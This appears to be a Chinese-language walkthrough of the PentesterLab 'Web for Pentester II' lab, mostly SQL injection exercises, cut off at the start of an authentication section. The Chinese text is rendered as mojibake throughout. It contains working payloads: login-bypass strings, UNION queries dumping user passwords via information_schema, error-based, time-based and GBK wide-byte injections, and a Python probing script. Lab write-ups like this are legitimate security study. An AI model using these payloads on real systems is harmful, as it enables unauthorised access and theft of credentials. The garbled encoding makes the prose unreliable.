REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥å­¦ä¹ ç¬”è®°","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"PentesterLabåˆ·é¢˜è®°å½•","path":"/2023/12/14/pentesterlab-xi-lie/","content":"0x01 æ­å»º æ–‡ä»¶ä¸‹è½½åœ°å€ï¼šhttps://pentesterlab.com/exercises/web_for_pentester_II/attachments ä¸‹è½½ä¹‹åæ–°å»ºè™šæ‹Ÿæœºç›´æ¥å¯¼å…¥isoæ–‡ä»¶ï¼Œä¹‹åä¸€è·¯é»˜è®¤ä¸‹ä¸€æ­¥å³å¯ï¼Œå¼€å¯è™šæ‹ŸæœºåifconfigæŸ¥çœ‹ipç›´æ¥è®¿é—®å°±è¡Œï¼Œå¦‚æœè®¿é—®ä¸äº†ï¼Œåˆ™æ¢æˆæ¡¥æ¥æ¨¡å¼ã€‚ æ­å»ºæˆåŠŸçš„ç»“æœï¼š å®˜æ–¹è¯´æ˜ï¼š å¦‚æœæ‚¨è¿˜æ²¡æœ‰è¿™æ ·åšï¼Œè¯·åŠ¡å¿…æŸ¥çœ‹æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç»ƒä¹ ï¼šWeb For Pentesterã€‚åœ¨å¼€å§‹è¿™ä¸€é¡¹ä¹‹å‰ï¼Œå…ˆä»å®ƒå¼€å§‹ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚ å¦‚æœæ‚¨æ„Ÿè§‰çœŸçš„å¾ˆèˆ’æœï¼Œæ‚¨å¯ä»¥å°è¯•åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œè€Œæ— éœ€éµå¾ªè¯¾ç¨‹ã€‚æ‚¨åªéœ€è¦èƒ½å¤Ÿç¼–å†™å°è„šæœ¬æ¥å‘é€ HTTP è¯·æ±‚ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥å®Œæˆæ‰€æœ‰è¿™äº›ç»ƒä¹  0x02 SQLæ³¨å…¥ å®˜æ–¹è¯´æ˜ï¼š æœ¬èŠ‚æä¾›äº†ä¸€äº›å¸¸è§çš„ SQL æ³¨å…¥ç¤ºä¾‹ï¼Œç¬¬ä¸€ä¸ªç¤ºä¾‹æ˜¯èº«ä»½éªŒè¯ç»•è¿‡ï¼Œå…¶ä»–ç¤ºä¾‹æ˜¯æ›´ä¼ ç»Ÿçš„ SQL æ³¨å…¥ã€‚ Example 1 é¦–é¡µæ˜¯ä¸€ä¸ªpostçš„ä¼ å‚ï¼Œæˆ‘ä»¬å…ˆæµ‹è¯•ä¸€ä¸‹ è¿™é‡Œè¾“å…¥1â€™å‘ç°æŠ¥é”™ï¼Œç›´æ¥æ˜¾ç¤ºäº†æŸ¥è¯¢è¯­å¥ã€‚ã€‚ã€‚ï¼Œé‚£æˆ‘ä»¬æ ¹æ®sqlè¯­å¥æ„é€ ä¸‡èƒ½å¯†ç å³å¯ã€‚ SELECT * FROM users WHERE username='' AND password='1' or '1'='1' æ„é€ åŸå› ä¸ºåœ¨sqlè¯­æ³•ä¸­andä¼˜å…ˆçº§é«˜äºorï¼Œé‚£ä¸Šè¿°sqlè¯­å¥åœ¨å¤„ç†çš„æ—¶å€™ä¼šå…ˆåˆ¤æ–­username='' AND password='1'å¾ˆæ˜æ˜¾ä¸ºfalseï¼Œæ¥ç€åœ¨åˆ¤æ–­ username='' AND password='1' or '1'='1'å³false or '1'='1' = false or true = trueä¸ºçœŸã€‚ ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å°†passwordèµ‹å€¼ä¸º1' or '1'='1å°†æˆåŠŸç»•è¿‡ï¼Œå¦‚ä¸‹å›¾ä¹ŸæˆåŠŸéªŒè¯ã€‚ å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦ï¼š ä»¤username=admin' or 1=1#åˆ™ä¸éœ€è¦è¾“å…¥password é™„ä¸Šå‡ ä¸ªå…¶ä»–å¸ˆå‚…çš„å§¿åŠ¿ï¼Œä¸‡å˜ä¸ç¦»å…¶å®— \"or\"=\"a'='a a'or' 1=1-- 'or''=' Example 2 ä¾æ—§æ˜¯ç®€å•æµ‹è¯•ï¼Œè™½ç„¶è¯­å¥ä¸ä¸Šå…³ä¸€æ ·ï¼Œä½†ä¸‡èƒ½å¯†ç æ— æ•ˆäº†ã€‚äºæ˜¯çœ‹äº†å‡ ä¸ªwpè™½ç„¶çŸ¥é“å¦‚ä½•é€šè¿‡ï¼Œä½†åŸç†æœ‰ç‚¹ä¸æ¸…æ¥šã€‚è¿™é‡Œæœ‰çš„å¸ˆå‚…ç›´æ¥è”åˆæ³¨å…¥æŸ¥è¯¢å°±è¡Œäº†ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯é™åˆ¶äº†æŸ¥è¯¢ç»“æœæ•°ï¼Œpayloadå¦‚ä¸‹ï¼š å§¿åŠ¿ä¸€ï¼š admin' or 1=1 limit 1# æˆ–è€…ï¼š å§¿åŠ¿äºŒï¼š 1' order by 3# æ¥ç€ 1' union select 1,2,3# è¿™é‡Œä¸‡èƒ½å¯†ç æ— æ•ˆçš„åŸå› å¯èƒ½æ˜¯åå°æºç åªå…è®¸æŸ¥è¯¢å‡ºä¸€æ¡æ•°æ®ï¼Œä½†å¦‚æœä½ ä½¿ç”¨ä¸‡èƒ½ç§˜å¯†ï¼Œä»–æ˜¯æ’çœŸçš„è¯­å¥ï¼Œä¸€å®šä¼šæŸ¥è¯¢å‡ºæ‰€æœ‰æ•°æ®çš„ï¼Œè¿™é‡Œå°±ä¼šæœ‰å†²çªã€‚ Example 3 è¿™é‡Œè¾“å…¥1â€™æ— æ³•æŠ¥é”™äº†ï¼Œæ¥ç€è¾“å…¥1\\æˆåŠŸæŠ¥é”™ï¼Œè¿™é‡Œä¹Ÿæ˜¯æ‡µé€¼ï¼Œçœ‹äº†wpæ‰æƒ³åˆ°å•å¼•å·è¢«è¿‡æ»¤äº†ã€‚è¿™é‡Œè¿˜æ˜¯å¤ªèœäº†ï¼Œä¸çŸ¥é“å¦‚ä½•æ„é€ äº†ï¼Œå­¦ä¹ ä¸€ä¸‹å¸ˆå‚…ä»¬çš„å§¿åŠ¿ å§¿åŠ¿ä¸€ å°è¯•å»æ„é€ åŠè§„é¿ï¼š username=\\ password=or 1=1# è¿™æ ·çš„è¯: SELECT * FROM users WHERE username='\\' AND password='or 1=1#' ç›¸å½“äº: SELECT * FROM users WHERE username=('\\' AND password=') or 1=1 #è¿™é‡Œæ‹¬å·èµ·æç¤ºä½œç”¨ å³: æ„é€ username='x' or 1=1 è€Œåé¢çš„å†…å®¹è¢«#æ³¨é‡Šäº†,å› æ­¤æˆ‘ä»¬æˆåŠŸä½¿è¯¥sqlä¸ºçœŸ å®è·µä¸€ä¸‹ï¼ŒæˆåŠŸç»•è¿‡ã€‚ å§¿åŠ¿äºŒï¼š username=\\&amp;password=||1# è¿™é‡Œä¸ä¸Šè¿°å§¿åŠ¿ä¸€å·®ä¸å¤šï¼Œåªä¸è¿‡å°†oræ›¿æ¢ä¸ºäº†||ã€‚è¿™æ ·çš„è¯å¯ä»¥å¦‚ä¸‹å˜å½¢ username=\\&amp;password=||1=1# username=\\&amp;password=or 1# Example 4 è¿™å…³åˆ°äº†ç†Ÿæ‚‰çš„æŸ¥è¯¢ç¯èŠ‚ï¼Œè¿™é‡Œå¯¹usernameçš„å‚æ•°ç»è¿‡æµ‹è¯•æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬å¸¸è§„æ€è·¯å³å¯ï¼Œç®€å•æ­¥éª¤è¿™é‡Œä¸èµ˜è¿°äº† ?req=username='hacker' union select database(),2,3--+ ?req=username='hacker' union select group_concat(table_name),2,3 from information_schema.tables where table_name='sqlinjection_example4' ?req=username='hacker' union select group_concat(column_name),2,3 from information_schema.columns where table_name='sqlinjection_example4' and table_name='users' æˆ– ?req=username='hacker' union select group_concat(column_name),2,3 from information_schema.columns where table_name='users' ?req=username='hacker' union select group_concat(id,'--&gt;',password),2,3 from users å¦å¤–æ—¢ç„¶è¿™å…³æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œé‚£è‚¯å®šè¿˜å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š ?req=username and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) å‰©ä¸‹ä¸åœ¨èµ˜è¿° Example 5 è¿™å…³ç®€å•æµ‹è¯•äº†ä¸‹å‘ç°æ˜¯å¯¹limitçš„å€¼çš„æŸ¥è¯¢ï¼Œè™½ç„¶æµ‹è¯•äº†ä¸Šå…³çš„payloadå¯ä»¥ä½¿ç”¨ï¼Œä½†ä¸çŸ¥ä¸ºä½•æŠ¥é”™æ³¨å…¥ä¸å¯ï¼Œä¹‹åç»§ç»­æµ‹è¯•å‘ç°ä½¿ç”¨è”åˆæ³¨å…¥å¯ä»¥è¿›è¡ŒæŠ¥é”™ã€‚ã€‚ã€‚ã€‚ ?limit=4 union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) æ­£å¸¸æ¥è¯´è¿™æ ·å³å¯ï¼Œä¸è¿‡è¿™é‡Œä¸ç†è§£çš„ç‚¹æ˜¯order byåˆ¤æ–­åˆ—æ•°ä¸ç®¡ç”¨ï¼Œæ€»æ˜¯æŠ¥é”™ï¼Œä¼°è®¡å’Œsqlè¯­æ³•æœ‰å…³ã€‚ ?limit=4 union select group_concat(id,'--&gt;',password),2,3 from users æŸ¥è¯¢ä¸€ç•ªå‘ç°å¦‚ä¸‹ï¼š LIMITå’ŒORDER BYå¦‚ä½•ç»„åˆä½¿ç”¨ å½“åŒæ—¶ä½¿ç”¨LIMITå’ŒORDER BYæ—¶ï¼Œåº”è¯¥æ³¨æ„å®ƒä»¬æ˜¯å¦‚ä½•ç»„åˆä½¿ç”¨çš„ã€‚ LIMITå’ŒORDER BYçš„é¡ºåºå¯¹ç»“æœé›†æœ‰å½±å“ã€‚å¦‚æœåœ¨LIMITä¹‹å‰ä½¿ç”¨ORDER BYè¯­å¥ï¼Œåˆ™æ•°æ®åº“ä¼šå…ˆå¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Œç„¶åæ”¾å›æ‰€éœ€çš„è®°å½•ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„æŸ¥è¯¢å°†è¿”å›â€œemployeeâ€è¡¨ä¸­æœ€é«˜å·¥èµ„çš„å‰3ä¸ªå‘˜å·¥ï¼š SELECT * FROM employee ORDER BY salary DESC LIMIT 3; å¦‚æœå…ˆä½¿ç”¨LIMITï¼Œå†ä½¿ç”¨ORDER BYï¼Œæ•°æ®åº“ä¼šå…ˆè¿”å›æ‰€éœ€è®°å½•ï¼Œç„¶åå¯¹å®ƒä»¬è¿›è¡Œæ’åºã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´æ’åºç»“æœä¸æ­£ç¡®ã€‚ Example 6 SELECT * FROM users GROUP BY group(å¯æ§); sqlè¯­å¥å¦‚ä¸Šï¼Œgroup byä¼šæŒ‰ç…§åç»­çš„å­—æ®µä¹Ÿå°±æ˜¯groupå…³é”®è¯è¿›è¡Œåˆ†ç»„ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œä¾æ—§åŒexample 4çš„æ€è·¯å³å¯ï¼Œä¹Ÿæ˜¯æ²¡ä»»ä½•è¿‡æ»¤ Example 7 å§¿åŠ¿ä¸€ï¼š å¦‚ä¸Šå›¾ï¼Œsqlè¯­å¥å¦‚ä¸‹ SELECT * FROM users WHERE id(å¯æ§) è¿™é‡Œå…ˆåšäº†æŠ¥é”™æ³¨å…¥ ?id=1 union select 1, 2,updatexml(1,concat(0x7e,(SELECT group_concat(id,'--&gt;',password)from users limit 0,1),0x7e),1) å¦‚ä¸Šè¿°è¯­å¥ï¼Œä¸è¿‡è¿™é‡Œåªå±•ç¤ºäº†å¦‚ä¸‹å›¾ä¸€æ¡æ•°æ®ï¼Œæ¥ç€æˆ‘å°è¯•ç”¨limitå±•ç¤ºä¸‹ä¸€ä¸ªï¼Œä½†æ— æœï¼Œé¡µé¢æç¤ºåªèƒ½æ˜¾ç¤ºä¸€ä¸ªç”¨æˆ·ã€‚ã€‚ã€‚ã€‚æˆ‘ä¸ç†è§£ è¿™é‡Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„å§¿åŠ¿ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼š ?id=1 and 1=2 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b è¿™æ ·ä¹Ÿå¯ï¼š ?id=1 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b è¿™é‡Œå¸ˆå‚…ç”¨çš„æ˜¯ä¸»é”®é‡å¤æŠ¥é”™ï¼Œä¸è¿‡å…·ä½“åŸç†æˆ‘è®°ä¸å¤ªæ¸…æ¥šäº†ï¼Œå†™å®Œè¿™ä¸ªç³»åˆ—ä¼šå»å¤ä¹ ä¸€æ³¢çš„ã€‚â€“ç–‘ç‚¹ï¼šä¸ºä½•selectåé¢è¦è·Ÿä¸ª1 ä½†è¿™é‡Œæˆ‘å°è¯•æ¥ç€çˆ†ç”¨æˆ·åå’Œç§˜å¯†ï¼Œä½†ä¾æ—§åªèƒ½æœ‰ä¸€æ¡æ•°æ®ã€‚æ¥ç€åˆå»æ‰¾å‡ ç¯‡wpå‘ç°è¿˜æ˜¯å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ã€‚ã€‚ã€‚ ?id=extractvalue(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1))) æˆ–è€… ?id=updatexml(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1)),0x7e) ä¸”è¿™ç§payloadåªéœ€è¦æ§åˆ¶limitå³å¯çˆ†å‡ºæ‰€æœ‰æ•°æ®ï¼Œæ¥ç€æˆ‘åˆåˆ†æäº†ä¸€ä¸‹æœ€å¼€å§‹çš„payloadä¸ä¸Šè¿°çš„ä¸åŒç‚¹ ?id=updatexml(1,concat(0x7e,(SELECT group_concat(username,'--&gt;',password)from users limit 0,1),0x7e),1) ä¸ ?id=updatexml(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1)),0x7e) å¾ˆæ˜æ˜¾å°±æ˜¯group_concatçš„åŸå› äº†ï¼Œä¸ºæ­¤æˆ‘ä»¬äº†è§£ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ« concat()å‡½æ•° åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šconcat(str1, str2,â€¦) è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯æ¯æ¬¡åªè¿”å›çš„æ˜¯ä¸€è¡Œçš„æ•°æ®ã€‚â€“è¿™é‡Œçš„æµ‹è¯•å°±ç›´æ¥æ‹¿ç°æˆçš„å›¾äº†ï¼Œæ‡’å¾—å»æ‰‹å·¥äº†ã€‚ è¿™é‡Œå€Ÿç”¨sqli-labsçš„usersè¡¨æ¼”ç¤ºï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹usersè¡¨çš„ç»“æ„ä»¥åŠéƒ½æœ‰å“ªäº›æ•°æ®ã€‚ å¯ä»¥çœ‹åˆ°usersè¡¨ä¸­æœ‰ä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸ºidã€usernameã€passwordã€‚ç„¶åä¸€å…±æœ‰13æ¡æ•°æ®ã€‚ ä½¿ç”¨concat()å‡½æ•°æ¼”ç¤ºä¸€ä¸‹ å¯ä»¥çœ‹åˆ°concat()å°†æ¯ä¸€æ¬¡æŸ¥è¯¢çš„idå’Œusernameçš„å€¼è¿æ¥åˆ°ä¸€èµ·å½¢æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›äº†ï¼Œå¹¶ä¸”ä¸€å…±è¿”å›çš„æ˜¯13æ¡è®°å½•ï¼Œä½†æ˜¯æ³¨æ„å½“concat()ä¸­æœ‰ä¸€ä¸ªå‚æ•°æ˜¯nullæ—¶ï¼Œè¿”å›çš„éƒ½æ˜¯null group_concat()å‡½æ•° group_concat()å‡½æ•°æ˜¯å°†æ‰€æœ‰çš„æŸ¥è¯¢ç»“æœæ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ï¼Œä¸è¿‡åœ¨ä¸åŒçš„å­—æ®µå€¼ä¹‹é—´é»˜è®¤æ˜¯ç”¨é€—å·éš”å¼€çš„ å¯ä»¥çœ‹åˆ°è¿”å›çš„å€¼å°±åªæœ‰ä¸€ä¸ªå€¼ã€‚ åƒconcat()å‡½æ•°é‚£æ ·ç›´æ¥æ‹¼æ¥å†…å®¹ï¼Œä¸­é—´æ²¡æœ‰åšéš”ç¦»ï¼Œå¾ˆå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬æ— æ³•åˆ¤æ–­å“ªäº›å­—ç¬¦æ˜¯å±äºå“ªä¸€ä¸ªå­—æ®µçš„ã€‚è€Œgroup_concat()å‡½æ•°é»˜è®¤æ˜¯ç”¨é€—å·éš”å¼€ä¸¤è¡Œä¸åŒæŸ¥è¯¢ç»“æœçš„ã€‚å½“ç„¶ä¹Ÿæ”¯æŒè‡ªå·±å®šä¹‰éš”ç¦»çš„ç¬¦å·ã€‚ concat_ws()å‡½æ•° åŠŸèƒ½ï¼šå’Œconcat()ä¸€æ ·ï¼Œå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¯ä»¥ä¸€æ¬¡æ€§æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆconcat_wså°±æ˜¯concat with separatorï¼‰ è¯­æ³•ï¼šconcat_ws(separator, str1, str2, â€¦) è¯´æ˜ï¼šç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æŒ‡å®šçš„åˆ†éš”ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ†éš”ç¬¦ä¸èƒ½ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œåˆ™è¿”å›ç»“æœä¸ºnullï¼ˆå…¶ä»–å‚æ•°å“ªä¸€ä¸ªä¸ºnullä¹Ÿæ˜¯ä¸€æ ·çš„ï¼‰ã€‚ æ¥ä¸‹æ¥æ˜¯è¿™ä½å¸ˆå‚…è‡ªå·±çš„è§è§£ï¼š åœ¨sqlæ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬è¦åˆ†æƒ…å†µçš„æ¥ä½¿ç”¨è¿™ä¸‰ä¸ªå‡½æ•°ã€‚ ä¸€èˆ¬åœ¨æ³¨å…¥ä¸­å› ä¸ºå›æ˜¾çš„ä½ç½®æœ‰é™ï¼Œæˆ‘ä»¬å°±ä¼šä½¿ç”¨concatå‡½æ•°æŠŠä¸åŒçš„å­—æ®µè¿èµ·æ¥ï¼Œä½†æ˜¯concat()å‡½æ•°ä¸€æ¬¡è¿”å›çš„åªæ˜¯ä¸€è¡Œçš„æ•°æ®ï¼Œæ‰€ä»¥è¿˜éœ€è¦ç»“åˆlimitä¸€èµ·ä½¿ç”¨ï¼Œä¸€ä¸ªä¸€ä¸ªçš„éå†æŸ¥çœ‹ã€‚ ä½†æ˜¯éå†æŸ¥çœ‹æœªå…å¤ªè¿‡äºéº»çƒ¦ï¼Œè¿™ä¸ªæ—¶å€™group_concat()å‡½æ•°å°±ä½“ç°å‡ºä¼˜åŠ¿äº†ã€‚å› ä¸ºå®ƒå¯ä»¥æŠŠæ‰€æœ‰çš„æŸ¥è¯¢ç»“æœé›†ä¸­åˆ°ä¸€èµ·è¿”å›ã€‚è¿™é‡Œå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯group_concat()å‡½æ•°å¯¹äºè¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚ä½¿ç”¨ show variables like 'group_concat_max_len' æŸ¥çœ‹ç³»ç»Ÿå˜é‡å¯¹è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦é™åˆ¶ï¼Œä¸€èˆ¬éƒ½æ˜¯1024ä¸ªå­—ç¬¦é•¿åº¦ã€‚ æ–‡ç« åœ°å€ï¼šgroup_concat()ä¸concat()ä»¥åŠconcat_ws()ä¹‹é—´çš„åŒºåˆ« æœ‰äº†è¿™ä¸‰ä¸ªå‡½æ•°çš„è§£é‡Šæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çŸ¥é“ä¸Šè¿°æˆ‘æœ€å¼€å§‹ä½¿ç”¨çš„payloadçš„é”™è¯¯ï¼Œå› ä¸ºgroup_concatå‡½æ•°æœ€ç»ˆè¿”å›çš„ç»“æœåªæœ‰ä¸€è¡Œï¼Œè€Œæ­¤æ—¶æˆ‘è¿˜å¦„æƒ³ç€limitå»æ˜¾ç¤ºå…¶ä»–è¡Œï¼ˆä½†å®é™…å°±ä¸€è¡Œï¼‰è¿™è‚¯å®šæ˜¯è’è°¬çš„ã€‚æ•…æ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨leftï¼Œsubstringç­‰å‡½æ•°å»å°†é‚£ä¸€è¡Œé•¿æ•°æ®è¿›è¡Œå›æ˜¾ï¼ˆä½†æ— ç–‘åœ¨è¿™ç§æ–¹æ³•ä¼¼ä¹æœ‰ç‚¹è´¹åŠ²ï¼‰ã€‚ å¯¹æ­¤å¦‚æœæˆ‘ä»¬ä½¿ç”¨cancatå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹limitå³å¯æ‰¾åˆ°æ‰€æœ‰æ•°æ®ã€‚ å§¿åŠ¿äºŒï¼š å…¶ä»–å¸ˆå‚…å‘¢è¿˜ä½¿ç”¨äº†ç›²æ³¨ï¼Œæˆ‘ä»¬å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ ?id=1 and if(length(database())=21,sleep(5),1) --+ æ¥ç€æˆ‘ä»¬æ ¹æ®é¡µé¢å›æ˜¾å°±èƒ½åˆ¤æ–­å‡ºï¼Œdatabaseä¸º21ä¸ªå­—ç¬¦ï¼Œæ¥ç€æˆ‘ä»¬å¯ä»¥å°è¯•å†™è„šæœ¬æˆ–è€…sqlmapè·‘ï¼Œè¿™é‡Œæˆ‘å°±ç”¨sqlmapäº†ï¼Œæ¯•ç«Ÿè„šæœ¬æˆ‘ä¸ä¼šå†™ï¼ˆå¤§èœé¸¡ï¼‰ã€‚ã€‚ã€‚ã€‚ èµ‹ä¸ªæºç ï¼šå’±ä¹Ÿä¸çŸ¥é“å¸ˆå‚…ä»¬å’‹æ‰¾åˆ°æºç çš„ã€‚ã€‚ã€‚ã€‚ get \"/users/:id\" do ActiveRecord::Base.establish_connection SQLInjectionExample8.db @user = User.find(params[:id]) if @user begin sql = \"SELECT * FROM users WHERE username='#{@user.username}' \" @res = ActiveRecord::Base.connection.execute(sql).to_a[0] erb :user rescue Exception =&gt; e @message = e.to_s end end end post '/user' do User.create(:username =&gt; params[:user], :password =&gt; Digest::MD5.hexdigest(SEED+params[\"password\"]+SEED)) redirect SQLInjectionExample8.path end Example 8 ç®€å•æµ‹è¯•å‡ ä¸‹ï¼Œä¸éš¾æ„Ÿè§‰è¿™æ˜¯ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥ï¼Œé‚£æˆ‘ä»¬å°±è¦é¦–å…ˆåˆ›é€ ä¸€ä¸ªå«æœ‰æ¶æ„sqlè¯­å¥çš„ç”¨æˆ·åï¼Œæ¥ç€æˆ‘ä»¬éœ€è¦æ‰¾æŸä¸ªæ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¼šè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·åçš„åŠŸèƒ½ï¼Œè¿™æ ·æ‰èƒ½è§¦å‘æˆ‘ä»¬çš„æ¶æ„æ•°æ®ã€‚ ä½†è¿™é‡Œåˆšå¼€å§‹åªæœ‰ä¸€ä¸ªåˆ›å»ºç”¨æˆ·ï¼Œæˆ‘å¹¶ä¸èƒ½æ‰¾åˆ°å…¶ä»–é¡µé¢ï¼Œä¹Ÿæ˜¯çœ‹äº†wpå‘ç°å¯ä»¥dirsearchæ‰«ä¸€ä¸‹ç›®å½•çš„ï¼Œå¦‚ä¸‹å›¾æ‰«åˆ°äº†usersç›®å½• ä¸è¿‡å›è¿‡å¤´æ¥æˆ‘å‘ç°ï¼Œé‚£ä¸ªå·¦ä¾§çš„æ•°å­—å¯ä»¥ç›´æ¥ç‚¹çš„ã€‚ã€‚ã€‚ã€‚ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬åˆ›å»ºç”¨æˆ·5ä¹‹åï¼Œç‚¹å‡»è®¿é—®å³å¯ Example 9 å…ˆèµ‹ä¸ªæºç  get '/' do ActiveRecord::Base.establish_connection SQLInjectionExample9.db res = [] if params['username'] &amp;&amp; params['password'] begin sql= \"SET CHARACTER SET 'GBK';\" ActiveRecord::Base.connection.execute(sql) name = ActiveRecord::Base.connection.quote_string(params[:username]) password = Digest::MD5.hexdigest(SEED+ActiveRecord::Base.connection.quote_string(params[:password]+SEED)) sql = \"SELECT * FROM users WHERE username='#{name}'\" sql+= \" AND password='\"+password+\"'\" res = ActiveRecord::Base.connection.execute(sql).to_a rescue Exception =&gt; e @message = e.to_s end end pp res if res.size &gt; 0 erb :index else erb :login end end æŸ¥è¯¢é¡µé¢ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ä¸çŸ¥é“æ˜¯å•¥ç©æ„å„¿ï¼ˆæ„Ÿè§‰sql-labsç™½åˆ·äº†ã€‚ã€‚ã€‚ï¼‰çœ‹äº†wpå‘ç°æ˜¯æœ‰å…³å®½å­—èŠ‚æ³¨å…¥çš„ é‚£æˆ‘ä»¬ç›´æ¥payloadï¼Œä¸è¿‡#éœ€è¦ç¼–ç æˆ–è€…ç›´æ¥ç”¨â€“+ï¼ŒåŸå› ï¼šurlä¸­#å·æ˜¯ç”¨æ¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œçš„ï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰ï¼Œå¯¹æœåŠ¡å™¨ç«¯å®Œå…¨æ— ç”¨ï¼ˆpostä¼ å‚åˆ™å¯ä»¥ç›´æ¥#ï¼‰ã€‚ å…·ä½“ä¹Ÿå¯å‚è€ƒï¼šSQLæ³¨å…¥ä¸­ #ã€ --+ã€ --%20ã€ %23æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ ?id=1%df' or 1=1%23 è¿™æ ·æˆ‘ä»¬çš„å•å¼•å·å°±é€ƒé€¸å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸ä¸‡èƒ½å¯†ç  è¿™é‡Œé™„ä¸€ä¸ªå¸ˆå‚…çš„è„šæœ¬ï¼Œç”¨æ¥æ£€æµ‹å“ªäº›æ˜¯å¯ä»¥è¿›è¡Œå®½å­—èŠ‚æ³¨å…¥çš„å­—ç¬¦ def sql9(): url = \"http://10.108.40.237/sqlinjection/example9/?username=a%{}%27%20or%201=1%23&amp;password=a&amp;submit=Submit\" for x in xrange(255): char = hex(x)[2:] if len(char) == 1: char = \"0\" + char html = requests.get(url.format(char)) if \"Success\" in html.text: print \"[+] 0x{} works\".format(char) print \"Done\" 0x03 Authentication-è®¤è¯ å®˜æ–¹è¯´æ˜ï¼š æœ¬èŠ‚æ±‡æ€»äº†èº«ä»½éªŒè¯é¡µé¢ä¸­çš„é—®é¢˜ç¤ºä¾‹ï¼šä»å¾®ä¸è¶³é“çš„æš´åŠ›ç ´è§£åˆ°æ›´å¤æ‚çš„é—®é¢˜ã€‚ Example 1 è¿›å…¥é¡µé¢æ˜¯ä¸€ä¸ªjsçš„ç™»å½•æ¡†ï¼Œåˆ·é¢˜å¤šäº†å°±å¾ˆç†Ÿæ‚‰ï¼Œä¼°è®¡è¿™é‡Œä¼šæœ‰ä¸€ä¸ªAuthenticationå¤´å…¶ä¸­ä¼šåŒ…å«ä½ åœ¨ä¸Šè¿°è¾“å…¥æ¡†ä¸­è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”æ˜¯ç»è¿‡base64åŠ å¯†çš„ åœ¨HTTPä¸­ï¼ŒåŸºæœ¬è®¤è¯ï¼ˆè‹±è¯­ï¼šBasic access authenticationï¼‰æ˜¯å…è®¸httpç”¨æˆ·ä»£ç†ï¼ˆå¦‚ï¼šç½‘é¡µæµè§ˆå™¨ï¼‰åœ¨è¯·æ±‚æ—¶ï¼Œæä¾› ç”¨æˆ·å å’Œ å¯†ç  çš„ä¸€ç§æ–¹å¼ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥ä¹‹åé€šè¿‡bpæŠ“ä¸€ä¸‹ï¼Œè¿›è¡Œçˆ†ç ´å³å¯ 